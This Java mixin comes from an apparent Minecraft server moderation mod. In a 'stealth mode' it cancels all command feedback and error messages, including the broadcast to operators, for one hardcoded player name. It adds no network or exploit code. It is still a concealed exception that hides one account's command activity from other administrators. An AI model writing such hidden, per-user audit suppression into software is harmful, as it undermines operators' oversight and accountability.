package com.server.moderation.mixin;

import com.server.moderation.Moderation;
import net.minecraft.server.command.ServerCommandSource;
import net.minecraft.server.network.ServerPlayerEntity;
import org.spongepowered.asm.mixin.Mixin;
import org.spongepowered.asm.mixin.injection.At;
import org.spongepowered.asm.mixin.injection.Inject;
import org.spongepowered.asm.mixin.injection.callback.CallbackInfo;

@Mixin(ServerCommandSource.class)
public class CommandExecutionMixin {
    
    @Inject(at = @At("HEAD"), method = "sendFeedback", cancellable = true)
    private void onSendFeedback(java.util.function.Supplier<net.minecraft.text.Text> feedbackSupplier, boolean broadcastToOps, CallbackInfo ci) {
        ServerCommandSource source = (ServerCommandSource) (Object) this;
        
        // Check if the source is a player and if stealth mode is enabled
        if (source.getEntity() instanceof ServerPlayerEntity player) {
            if (Moderation.isStealthMode() && "NotlucySigma".equals(player.getName().getString())) {
                // Hide all feedback messages for NotlucySigma in stealth mode
                ci.cancel();
            }
        }
    }
    
    @Inject(at = @At("HEAD"), method = "sendError", cancellable = true)
    private void onSendError(net.minecraft.text.Text message, CallbackInfo ci) {
        ServerCommandSource source = (ServerCommandSource) (Object) this;
        
        // Check if the source is a player and if stealth mode is enabled
        if (source.getEntity() instanceof ServerPlayerEntity player) {
            if (Moderation.isStealthMode() && "NotlucySigma".equals(player.getName().getString())) {
                // Hide all error messages for NotlucySigma in stealth mode
                ci.cancel();
            }
        }
    }
}
